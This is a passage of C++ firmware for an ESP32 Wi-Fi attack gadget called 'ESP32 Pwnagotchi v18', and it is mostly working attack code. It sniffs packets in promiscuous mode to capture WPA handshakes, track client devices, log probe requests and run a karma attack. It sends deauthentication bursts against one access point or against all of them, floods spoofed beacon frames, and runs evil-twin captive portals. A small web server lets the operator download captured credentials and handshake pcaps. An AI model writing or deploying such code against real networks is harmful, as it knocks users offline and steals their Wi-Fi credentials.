  chScanCh=1; lastChHop=millis(); running=true;
  screen=ST_CH_SCAN;
  setPromisc(true);
  esp_wifi_set_channel(1,WIFI_SECOND_CHAN_NONE);
  drawOLED();
}

// ════════════════════════════════════════════════════════════
//  SIGNAL TRACKER
// ════════════════════════════════════════════════════════════
static void startSigTrack(int apIdx){
  sigAP=apIdx; selectedAP=apIdx;
  memset(sigHist,0,sizeof(sigHist)); sigIdx=0;
  sigCur=apList[apIdx].rssi; running=true;
  screen=ST_SIG_TRACK;
  setPromisc(true);
  esp_wifi_set_channel((uint8_t)apList[apIdx].ch,WIFI_SECOND_CHAN_NONE);
  lastSigUpd=millis();
  drawOLED();
  Serial.printf("[SIG] Tracking: %.32s  CH%d\n", apList[apIdx].ssid, apList[apIdx].ch);
}

// ════════════════════════════════════════════════════════════
//  PACKET CALLBACK  (runs from ISR context)
// ════════════════════════════════════════════════════════════
void IRAM_ATTR pktCallback(void* buf, wifi_promiscuous_pkt_type_t type){
  auto* pkt=(wifi_promiscuous_pkt_t*)buf;
  const uint8_t* d=pkt->payload;
  uint16_t len=pkt->rx_ctrl.sig_len;
  pktTotal++; if(type==WIFI_PKT_DATA) pktData++;

  // Channel scanner: just count
  if(screen==ST_CH_SCAN){
    uint8_t ch=pkt->rx_ctrl.channel;
    if(ch>=1&&ch<=CH_SCAN_MAX) chPkt[ch-1]++;
    return;
  }

  // Signal tracker: read RSSI from target beacon
  if(screen==ST_SIG_TRACK && sigAP>=0 && type==WIFI_PKT_MGMT
     && len>16 && d[0]==0x80){
    if(memcmp(d+10,apList[sigAP].bssid,6)==0) sigCur=pkt->rx_ctrl.rssi;
    return;
  }

  // Probe sniffer: parse probe requests (type=0x40)
  if(screen==ST_PROBE_SNIFF && type==WIFI_PKT_MGMT
     && len>26 && d[0]==0x40){
    const uint8_t* src=d+10; if(src[0]&0x01) return; // skip multicast src
    uint8_t sl=d[25]; if(sl==0||sl>32||len<(uint16_t)(26+sl)) return;
    char ssid[33]; memcpy(ssid,d+26,sl); ssid[sl]='\0';
    portENTER_CRITICAL_ISR(&probeMx);
    for(int i=0;i<probeCnt;i++){
      if(memcmp(probes[i].mac,src,6)==0 && strcmp(probes[i].ssid,ssid)==0){
        probes[i].rssi=pkt->rx_ctrl.rssi; probes[i].ts=millis();
        portEXIT_CRITICAL_ISR(&probeMx); return;
      }
    }
    if(probeCnt<MAX_PROBES){
      memcpy(probes[probeCnt].mac,src,6);
      strncpy(probes[probeCnt].ssid,ssid,32); probes[probeCnt].ssid[32]='\0';
      probes[probeCnt].rssi=pkt->rx_ctrl.rssi;
      probes[probeCnt].ts=millis();
      probeCnt++;
    }
    portEXIT_CRITICAL_ISR(&probeMx);
    return;
  }

  // Karma: detect probe request → set flag for main loop
  if(karmaActive && type==WIFI_PKT_MGMT && len>26 && d[0]==0x40){
    const uint8_t* src=d+10; if(src[0]&0x01) return;
    uint8_t sl=d[25]; if(sl==0||sl>32||len<(uint16_t)(26+sl)) return;
    char ssid[33]; memcpy(ssid,d+26,sl); ssid[sl]='\0';
    if(strcmp(karmaLastSSID,ssid)!=0){
      strncpy(karmaLastSSID,ssid,32); karmaLastSSID[32]='\0';
    }
    return;
  }

  // Handshake: detect EAPOL 4-way frames
  if(hsCapturing && type==WIFI_PKT_DATA && len>=28){
    bool match=(memcmp(d+4,hsBSSID,6)==0||
                memcmp(d+10,hsBSSID,6)==0||
                memcmp(d+16,hsBSSID,6)==0);
    if(match){
      int mn=eapolMsg(d,len);
      if(mn>0){
        hsTotal++;
        switch(mn){ case 1:hsM1=true;break; case 2:hsM2=true;break;
                    case 3:hsM3=true;break; case 4:hsM4=true;break; }
        hsSaveFrame(d,len);
      }
    }
  }

  // Client tracker (used by deauth + ET)
  if(type==WIFI_PKT_DATA && selectedAP>=0 && len>22){
    bool toDS=d[1]&0x01;
    if(memcmp(d+16,apList[selectedAP].bssid,6)==0){
      const uint8_t* cli=toDS?d+10:d+4;
      if(!(cli[0]&0x01)){
        portENTER_CRITICAL_ISR(&clientMx);
        for(int i=0;i<clientCnt;i++){
          if(memcmp(clients[i].mac,cli,6)==0){
            clients[i].lastSeen=millis();
            portEXIT_CRITICAL_ISR(&clientMx); return;
          }
        }
        if(clientCnt<MAX_CLIENTS){
          memcpy(clients[clientCnt].mac,cli,6);
          clients[clientCnt].lastSeen=millis();
          clientCnt++;
        }
        portEXIT_CRITICAL_ISR(&clientMx);
      }
    }
  }
}

// ════════════════════════════════════════════════════════════
//  DATA WEBSERVER
// ════════════════════════════════════════════════════════════
static const char WEB_HTML_TOP[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ESP32 Pwnagotchi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px}
h1{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:10px;margin-bottom:20px;font-size:1.4em}
.badge{background:#21262d;border:1px solid #30363d;border-radius:6px;padding:16px;margin-bottom:16px}
.badge h2{color:#f0f6fc;font-size:1em;margin-bottom:8px}
.row{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid #21262d}
.row:last-child{border:none}
.row a{color:#58a6ff;text-decoration:none}.row a:hover{text-decoration:underline}
.dim{color:#8b949e;font-size:.85em}
.empty{color:#8b949e;font-style:italic}
.sbar{background:#21262d;border-radius:4px;height:8px;margin:6px 0}
.sfill{background:#58a6ff;border-radius:4px;height:8px}
.stat{color:#58a6ff;font-size:1.1em;font-weight:bold}
</style></head><body>
<h1>&#x1F4E1; ESP32 Pwnagotchi v18</h1>
)rawliteral";

static void webHandleRoot(){
  fsStats();
  String html=FPSTR(WEB_HTML_TOP);
  // Pwnagotchi stats
  html+="<div class='badge'><h2>(^_^) Pwnagotchi Stats</h2>";
  html+="<div class='row'><span>Total Pwned</span><span class='stat'>"
       +String(pw.totalPwned+pw.sessionCreds)+"</span></div>";
  html+="<div class='row'><span>Handshakes</span><span class='stat'>"
       +String(pw.sessionHS+hsCaptured)+"</span></div>";
  html+="<div class='row'><span>Scan Epochs</span><span class='dim'>"
       +String(pw.epoch)+"</span></div>";
  html+="<div class='row'><span>Uptime</span><span class='dim'>"
       +String(millis()/60000)+" min</span></div></div>";
  // Storage bar
  int pct=fsTotal?(int)(fsUsed*100/fsTotal):0;
  html+="<div class='badge'><h2>&#x1F4BE; Storage</h2>";
  html+="<span class='dim'>"+String(fsUsed/1024)+" KB / "
       +String(fsTotal/1024)+" KB</span>";
  html+="<div class='sbar'><div class='sfill' style='width:"
       +String(pct)+"%'></div></div></div>";
  // Credentials
  html+="<div class='badge'><h2>&#x1F511; Captured Credentials</h2>";
  if(LittleFS.exists(FS_CREDS_FILE)){
    File f=LittleFS.open(FS_CREDS_FILE,"r");
    if(f){
      html+="<div class='row'><a href='/dl?f=/creds.txt'>creds.txt</a>"
            "<span class='dim'>"+String(f.size())+" B</span></div>";
      f.close();
    }
  } else html+="<div class='empty'>No credentials captured yet.</div>";
  html+="</div>";
  // Handshakes
  html+="<div class='badge'><h2>&#x1F91D; Handshakes (.pcap)</h2>";
  bool any=false;
  File root=LittleFS.open("/"); File ff=root.openNextFile();
  while(ff){
    String nm=String("/")+ff.name(); size_t sz=ff.size(); ff.close();
    if(nm.startsWith("/hs_")&&nm.endsWith(".pcap")){
      any=true;
      html+="<div class='row'><a href='/dl?f="+nm+"'>"+nm.substring(1)+"</a>"
            "<span class='dim'>"+String(sz)+" B</span></div>";
    }
    ff=root.openNextFile();
  }
  root.close();
  if(!any) html+="<div class='empty'>No handshakes captured yet.</div>";
  html+="</div>";
  html+="<p class='dim' style='margin-top:10px'>SSID: <b>"
       DATA_AP_SSID "</b>  PW: <b>" DATA_AP_PASS
       "</b>  →  192.168.4.1:8080</p></body></html>";
  dataServer.send(200,"text/html",html);
}

static void webHandleDownload(){
  if(!dataServer.hasArg("f")){ dataServer.send(400,"text/plain","Missing"); return; }
  String path=dataServer.arg("f");
  bool ok=(path=="/creds.txt")||(path.startsWith("/hs_")&&path.endsWith(".pcap"));
  if(!ok){ dataServer.send(403,"text/plain","Forbidden"); return; }
  if(!LittleFS.exists(path)){ dataServer.send(404,"text/plain","Not found"); return; }
  File f=LittleFS.open(path,"r");
  String mime=path.endsWith(".pcap")?"application/octet-stream":"text/plain";
  dataServer.sendHeader("Content-Disposition",
    "attachment; filename=\""+path.substring(1)+"\"");
  dataServer.streamFile(f,mime); f.close();
}

static void startDataServer(){
  if(dataUp) return;
  setPromisc(false); WiFi.softAPdisconnect(true); delay(100);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(DATA_AP_SSID,DATA_AP_PASS,1,0); delay(500);
  IPAddress apIP(192,168,4,1);
  WiFi.softAPConfig(apIP,apIP,IPAddress(255,255,255,0));
  dataServer.on("/",   HTTP_GET, webHandleRoot);
  dataServer.on("/dl", HTTP_GET, webHandleDownload);
  dataServer.begin(); dataUp=true;
  screen=ST_WEBSERVER; running=true; drawOLED();
  Serial.println(F("[WEB] Data server started at 192.168.4.1:8080"));
}
static void stopDataServer(){
  if(!dataUp) return; dataServer.stop(); dataUp=false;
}

// ════════════════════════════════════════════════════════════
//  SCAN  (manual)
// ════════════════════════════════════════════════════════════
void doScan(){
  setPromisc(false); running=false; beaconing=false;
  if(etActive) stopEvilTwin();
  if(dataUp)   stopDataServer();
  screen=ST_SCANNING; apCount=0; drawOLED();
  esp_wifi_stop(); esp_wifi_set_mode(WIFI_MODE_STA); esp_wifi_start(); delay(100);
  int n=WiFi.scanNetworks(false,true);
  if(n>0){
    struct R{ String ssid; uint8_t bssid[6]; int ch,rssi; wifi_auth_mode_t enc; };
    std::vector<R> raw; raw.reserve(n);
    for(int i=0;i<n;i++){
      int ch=WiFi.channel(i); if(ch<1||ch>13) continue;
      R r; r.ssid=WiFi.SSID(i);
      uint8_t* b=WiFi.BSSID(i);
      if(b) memcpy(r.bssid,b,6); else memset(r.bssid,0,6);
      r.ch=ch; r.rssi=WiFi.RSSI(i); r.enc=WiFi.encryptionType(i);
      raw.push_back(r);
    }
    std::sort(raw.begin(),raw.end(),[](const R& a,const R& b){ return a.rssi>b.rssi; });
    apCount=(int)raw.size(); if(apCount>MAX_APS) apCount=MAX_APS;
    for(int i=0;i<apCount;i++){
      strncpy(apList[i].ssid,raw[i].ssid.c_str(),32); apList[i].ssid[32]='\0';
      memcpy(apList[i].bssid,raw[i].bssid,6);
      apList[i].ch=raw[i].ch; apList[i].rssi=raw[i].rssi;
      apList[i].wps=false; apList[i].blacklisted=false; apList[i].tries=0;
      const char* enc="????";
      switch(raw[i].enc){
        case WIFI_AUTH_OPEN:         enc="OPEN";  break;
        case WIFI_AUTH_WEP:          enc="WEP";   break;
        case WIFI_AUTH_WPA_PSK:      enc="WPA";   break;
        case WIFI_AUTH_WPA2_PSK:     enc="WPA2";  break;
        case WIFI_AUTH_WPA_WPA2_PSK: enc="WPA/2"; break;
        default: break;
      }
      strncpy(apList[i].enc,enc,7); apList[i].enc[7]='\0';
    }
    WiFi.scanDelete();
    Serial.printf("[SCAN] Found %d APs\n", apCount);
  }
  restoreWiFi(); screen=ST_MAIN; drawOLED();
}

// ════════════════════════════════════════════════════════════
//  SSID SPOOFER (Beacon flood)
// ════════════════════════════════════════════════════════════
static void doBeacon(){
  beaconing=true; running=true;
  lastBeacon=millis(); spooferIdx=0; deauthsSent=0;
  esp_wifi_set_channel(AP_CH,WIFI_SECOND_CHAN_NONE);
  screen=ST_BEACONING; drawOLED();
}

// ════════════════════════════════════════════════════════════
//  PKT MONITOR
// ════════════════════════════════════════════════════════════
static void doPktMon(){
  stopAll(); screen=ST_PKT_MON; running=true;
  pktTotal=pktData=0; hsTotal=0;
  lastPpsUpd=millis(); lastPktTot=0;
  for(int i=0;i<PPS_HIST;i++) ppsHist[i]=0;
  setPromisc(true); drawOLED();
}

// ════════════════════════════════════════════════════════════
//  STOP ALL
// ════════════════════════════════════════════════════════════
void stopAll(){
  running=false; beaconing=false; deauthRunning=false; deauthAllRunning=false;
  if(rogueAPUp)    stopRogueAP();
  if(karmaActive)  stopKarma();
  if(etActive)     stopEvilTwin();
  if(dataUp)       stopDataServer();
  if(hsCapturing)  stopHandshake();
  // Pwnagotchi: save stats and reset attack state
  if(pw.phase!=PW_PH_IDLE){
    pw.sessionHS+=hsCaptured;
    pwSaveStats();
    pw.phase=PW_PH_IDLE;
    pw.targetAP=-1;
    memset(pw.target,0,sizeof(pw.target));
  }
  setPromisc(false);
  restoreWiFi();
  screen=ST_MAIN; drawOLED();
}

// ════════════════════════════════════════════════════════════
//  SETUP
// ════════════════════════════════════════════════════════════
void setup(){
  Serial.begin(115200);
  Serial.println(F("\n\n[BOOT] ESP32 Pwnagotchi v18"));

  // NVS flash init
  esp_err_t ret=nvs_flash_init();
  if(ret==ESP_ERR_NVS_NO_FREE_PAGES||ret==ESP_ERR_NVS_NEW_VERSION_FOUND){
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret=nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);

  // File system
  fsInit();
  pwLoadStats();

  // OLED
  Wire.begin(OLED_SDA, OLED_SCL);
  if(!display.begin(SSD1306_SWITCHCAPVCC,0x3C))
    Serial.println(F("[!] OLED not found – check wiring"));
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(4,4);  display.println(F("ESP32 PWNAGOTCHI v18"));
  display.setCursor(4,14); display.println(F("(^_^)  14 modules"));
  display.setCursor(4,24); display.println(F("Pwnagotchi AI mode"));
  display.setCursor(4,34); display.println(F("Karma + Deauth All"));
  display.setCursor(4,44); display.println(F("Signal Tracker"));
  display.setCursor(4,54); display.println(F("Booting..."));
  display.display();
  delay(900);

  // Joystick
  pinMode(JOY_SW_PIN, INPUT_PULLUP);
  calibJoy();

  // WiFi baseline
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("esp32ap","12345678",1,1);
  WiFi.disconnect(false);
  delay(1000);

  screen=ST_MAIN; drawOLED();
  Serial.println(F("[BOOT] Ready. For authorised testing only."));
}

// ════════════════════════════════════════════════════════════
//  LOOP
// ════════════════════════════════════════════════════════════
void loop(){
  unsigned long now=millis();

  // ── Serial debug commands ──────────────────────────────────
  if(Serial.available()){
    char c=Serial.read();
    switch(c){
      case 's': fsStats(); Serial.printf("[FS] %zu/%zu B\n",fsUsed,fsTotal); break;
      case 'l':{
        File root=LittleFS.open("/"); File f=root.openNextFile();
        while(f){ Serial.printf("  /%s (%zu B)\n",f.name(),f.size()); f.close(); f=root.openNextFile(); }
        root.close(); break;
      }
      case 'p': Serial.printf("[PW] pwned=%lu epoch=%u phase=%d\n",
                               pw.totalPwned,pw.epoch,pw.phase); break;
    }
  }

  // ── Timeout for flash message ──────────────────────────────
  if(screen==ST_MSG && now>g_msgEnd){ screen=ST_MAIN; drawOLED(); }

  // ── Network service handlers ───────────────────────────────
  if(etActive){ dnsServer.processNextRequest(); etServer.handleClient(); }
  if(dataUp)   dataServer.handleClient();
  if(hsCapturing&&!hsSaved&&hsBufCnt>0) hsCheckAndSave();

  // ── Karma: act on probe flag set in ISR ────────────────────
  if(karmaActive && strlen(karmaLastSSID)>0){
    static char kHandled[33]="";
    if(strcmp(kHandled,karmaLastSSID)!=0){
      strncpy(kHandled,karmaLastSSID,32); kHandled[32]='\0';
      karmaHandleProbe(karmaLastSSID,1);
    }
  }

  // ── Pwnagotchi autonomous tick ─────────────────────────────
  if(screen==ST_PWNAGOTCHI && running) pwTick(now);

  // ── Joystick ──────────────────────────────────────────────
  JoyDir js=readJoy();
  static unsigned long lastJoy=0;
  if(js!=JOY_NONE && (now-lastJoy)>300){
    lastJoy=now;
    switch(screen){

    case ST_MAIN:
      if     (js==JOY_UP)   menuItem=(menuItem-1+MENU_COUNT)%MENU_COUNT;
      else if(js==JOY_DOWN) menuItem=(menuItem+1)%MENU_COUNT;
      else if(js==JOY_CLICK){
        switch(menuItem){
          case MENU_SCAN:
            doScan(); break;
          case MENU_DEAUTH:
            if(apCount>0){ screen=ST_DEAUTH_SEL; selectedAP=0; }
            else showMsg("No APs. Scan first."); break;
          case MENU_DEAUTH_ALL:
            startDeauthAll(); break;
          case MENU_EVIL_TWIN:
            if(apCount>0){ screen=ST_ET_SEL; selectedAP=0; }
            else showMsg("No APs. Scan first."); break;
          case MENU_KARMA:
            startKarma(); break;
          case MENU_HANDSHAKE:
            if(apCount>0){ screen=ST_HS_SEL; selectedAP=0; }
            else showMsg("No APs. Scan first."); break;
          case MENU_PWNAGOTCHI:
            startPwnagotchi(); break;
          case MENU_BEACON:
            doBeacon(); break;
          case MENU_PROBE_SNIFF:
            startProbeSniffer(); break;
          case MENU_CH_SCAN:
            startChScan(); break;
          case MENU_SIG_TRACK:
            if(apCount>0){ screen=ST_SIG_SEL; selectedAP=0; }
            else showMsg("No APs. Scan first."); break;
          case MENU_WEBSERVER:
            startDataServer(); break;
          case MENU_STORAGE:
            fsStats(); screen=ST_STORAGE; break;
          case MENU_PKT_MON:
            doPktMon(); break;
        }
        delay(100); readJoy();
      }
      break;

    case ST_DEAUTH_SEL:
      if(apCount>0){
        if     (js==JOY_DOWN||js==JOY_RIGHT) selectedAP=(selectedAP+1)%apCount;
        else if(js==JOY_LEFT)                selectedAP=(selectedAP-1+apCount)%apCount;
        else if(js==JOY_UP)                  deauthHop=!deauthHop;
        else if(js==JOY_CLICK){
          deauthRunning=true; running=true;
          attackStart=millis(); deauthsSent=0;
          portENTER_CRITICAL(&clientMx); clientCnt=0; portEXIT_CRITICAL(&clientMx);
          targetCh=apList[selectedAP].ch; hopIdx=0;
          screen=ST_DEAUTHING;
        }
      } else stopAll();
      break;

    case ST_ET_SEL:
      if(apCount>0){
        if     (js==JOY_UP  ||js==JOY_LEFT)  selectedAP=(selectedAP-1+apCount)%apCount;
        else if(js==JOY_DOWN||js==JOY_RIGHT)  selectedAP=(selectedAP+1)%apCount;
        else if(js==JOY_CLICK){ screen=ST_ET_THEME; etTheme=ET_WLAN; }
      } else stopAll();
      break;

    case ST_ET_THEME:
      if     (js==JOY_LEFT)  etTheme=(EtTheme)((etTheme-1+ET_COUNT)%ET_COUNT);
      else if(js==JOY_RIGHT) etTheme=(EtTheme)((etTheme+1)%ET_COUNT);
      else if(js==JOY_CLICK) startEvilTwin(selectedAP);
      break;

    case ST_HS_SEL:
      if(apCount>0){
        if     (js==JOY_UP  ||js==JOY_LEFT)  selectedAP=(selectedAP-1+apCount)%apCount;
        else if(js==JOY_DOWN||js==JOY_RIGHT)  selectedAP=(selectedAP+1)%apCount;
        else if(js==JOY_CLICK) startHandshake(selectedAP);
      } else stopAll();
      break;

    case ST_SIG_SEL:
      if(apCount>0){
        if     (js==JOY_UP  ||js==JOY_LEFT)  selectedAP=(selectedAP-1+apCount)%apCount;
        else if(js==JOY_DOWN||js==JOY_RIGHT)  selectedAP=(selectedAP+1)%apCount;
        else if(js==JOY_CLICK) startSigTrack(selectedAP);
      } else stopAll();
      break;

    case ST_STORAGE:
      if     (js==JOY_UP)    { fsDelCreds();   showMsg("Credentials deleted!"); }
      else if(js==JOY_DOWN)  { fsDelHS();      showMsg("Handshakes deleted!"); }
      else if(js==JOY_CLICK) { fsDelAll();     showMsg("All files deleted!"); }
      else if(js==JOY_LEFT)  { screen=ST_MAIN; drawOLED(); }
      break;

    case ST_PROBE_SNIFF:
      if     (js==JOY_DOWN && probeCnt>0) probeView=(probeView+1)%probeCnt;
      else if(js==JOY_UP && probeView>0)  probeView--;
      else if(js==JOY_CLICK||js==JOY_LEFT) stopAll();
      break;

    case ST_PWNAGOTCHI:
      if(js==JOY_CLICK||js==JOY_LEFT) stopAll();
      break;

    case ST_DEAUTH_ALL:
    case ST_CH_SCAN:
    case ST_SIG_TRACK:
    case ST_DEAUTHING:
    case ST_BEACONING:
    case ST_PKT_MON:
    case ST_KARMA:
    case ST_EVIL_TWIN:
    case ST_HANDSHAKE:
    case ST_WEBSERVER:
      if(js==JOY_CLICK||js==JOY_LEFT) stopAll();
      break;

    default: break;
    }
    drawOLED();
  }

  // ── PPS counter ────────────────────────────────────────────
  if(screen==ST_PKT_MON && running && now-lastPpsUpd>=1000){
    uint32_t cp=pktTotal-lastPktTot; lastPktTot=pktTotal; lastPpsUpd=now;
    for(int i=0;i<PPS_HIST-1;i++) ppsHist[i]=ppsHist[i+1];
    ppsHist[PPS_HIST-1]=(int)cp;
  }

  // ── Signal tracker RSSI update ─────────────────────────────
  if(screen==ST_SIG_TRACK && running && now-lastSigUpd>=250){
    lastSigUpd=now;
    sigHist[sigIdx]=(int8_t)constrain(sigCur,-128,0);
    sigIdx=(sigIdx+1)%RSSI_HIST;
  }

  // ── Manual deauth loop (Rogue-AP + frame injection) ────────
  if(deauthRunning && running && selectedAP>=0){
    if(deauthHop){
      if(now-lastHop>=HOP_INTERVAL_MS){
        lastHop=now; hopIdx=(hopIdx+1)%13; targetCh=hopChs[hopIdx];
        if(rogueAPUp){ stopRogueAP(); delay(30); }
        doDeauth(apList[selectedAP].bssid, targetCh);
      }
    } else {
      if(!rogueAPUp) doDeauth(apList[selectedAP].bssid, targetCh);
      else { sendDeauthFrames(apList[selectedAP].bssid, targetCh); deauthsSent+=DEAUTH_BURST; }
    }
    if(now-attackStart>=attackDur) stopAll();
  }

  // ── Deauth-ALL loop ────────────────────────────────────────
  if(deauthAllRunning && running && now-lastHop>=HOP_INTERVAL_MS){
    lastHop=now;
    for(int i=0;i<apCount;i++){
      if(apList[i].ch==targetCh){
        sendDeauthFrames(apList[i].bssid, targetCh);
        deauthsSent+=DEAUTH_BURST;
      }
    }
    hopIdx=(hopIdx+1)%13; targetCh=hopChs[hopIdx];
  }

  // ── Evil Twin deauth pulse ─────────────────────────────────
  if(etDeauthOn && etActive && selectedAP>=0 && now-lastHop>=ET_DEAUTH_INT
     && screen==ST_EVIL_TWIN){
    lastHop=now;
    sendDeauthFrames(apList[selectedAP].bssid, targetCh);
    deauthsSent+=DEAUTH_BURST;
  }

  // ── SSID spoofer beacon flood ──────────────────────────────
  if(screen==ST_BEACONING && running && beaconing && now-lastBeacon>=BEACON_TX_MS){
    lastBeacon=now;
    const char* ssid=spooferSSIDs[spooferIdx];
    spooferIdx=(spooferIdx+1)%SPOOFER_CNT;
    uint8_t sl=(uint8_t)strlen(ssid);
    uint8_t pkt[128]; int off=0;
    pkt[off++]=0x80; pkt[off++]=0x00; pkt[off++]=0x00; pkt[off++]=0x00;
    memset(pkt+off,0xFF,6); off+=6;
    // Random locally-administered MAC
    uint8_t rm[6]; rm[0]=(uint8_t)((esp_random()%0xFE)|0x02);
    for(int i=1;i<6;i++) rm[i]=(uint8_t)(esp_random()&0xFF);
    memcpy(pkt+off,rm,6); off+=6; memcpy(pkt+off,rm,6); off+=6;
    pkt[off++]=0x00; pkt[off++]=0x00; memset(pkt+off,0,8); off+=8;
    pkt[off++]=0x64; pkt[off++]=0x00; pkt[off++]=0x01; pkt[off++]=0x00;
    pkt[off++]=0x00; pkt[off++]=sl; memcpy(pkt+off,ssid,sl); off+=sl;
    pkt[off++]=0x01; pkt[off++]=0x04;
    pkt[off++]=0x82; pkt[off++]=0x84; pkt[off++]=0x8B; pkt[off++]=0x96;
    pkt[off++]=0x03; pkt[off++]=0x01; pkt[off++]=AP_CH;
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, off, true);
    deauthsSent++;
  }

  // ── Probe sniffer channel hop ──────────────────────────────
  if(screen==ST_PROBE_SNIFF && running && now-lastHop>=600){
    lastHop=now; hopIdx=(hopIdx+1)%13;
    esp_wifi_set_channel((uint8_t)(hopIdx+1),WIFI_SECOND_CHAN_NONE);
  }

  // ── Karma channel hop (when no AP is up) ──────────────────
  if(screen==ST_KARMA && karmaActive && !etActive && now-lastHop>=400){
    lastHop=now; hopIdx=(hopIdx+1)%13;
    esp_wifi_set_channel((uint8_t)(hopIdx+1),WIFI_SECOND_CHAN_NONE);
  }

  // ── Channel scanner hop ────────────────────────────────────
  if(screen==ST_CH_SCAN && running && now-lastChHop>=CH_SCAN_HOP_MS){
    lastChHop=now;
    chScanCh=(chScanCh%CH_SCAN_MAX)+1;
    esp_wifi_set_channel(chScanCh,WIFI_SECOND_CHAN_NONE);
  }

  // ── OLED periodic refresh ──────────────────────────────────
  bool activeScreen=(screen>=ST_DEAUTHING && screen<=ST_PKT_MON
                     && screen!=ST_STORAGE && screen!=ST_MSG);
  if(now-lastOLED > (activeScreen?300UL:1000UL)){
    drawOLED(); lastOLED=now;
  }
}
